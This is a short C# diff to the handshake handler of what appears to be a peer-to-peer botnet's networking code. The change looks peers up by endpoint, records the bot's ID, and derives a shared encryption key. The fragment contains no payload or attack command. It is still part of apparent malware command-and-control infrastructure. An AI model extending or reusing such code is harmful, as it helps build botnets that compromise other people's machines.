@@ -21,8 +21,10 @@ namespace Vinchuca.Network.Protocol.Handlers
         public void Handle(BotMessage botMessage)
         {
             var msg = botMessage.Message as HelloAckSynMessage;
-            var peerInfo = _peerList[botMessage.Header.BotId];
-
+            PeerInfo peerInfo;
+            if (!_peerList.TryGet(botMessage.Header.EndPoint, out peerInfo))
+                return;
+            peerInfo.BotId = botMessage.Header.BotId;
             peerInfo.EncryptionKey = DHKeyExchange.CalculateSharedKey(msg.PublicKey, BotIdentifier.PrivateKey);
             peerInfo.Handshaked = true;
             peerInfo.BotVersion = msg.BotVersion;
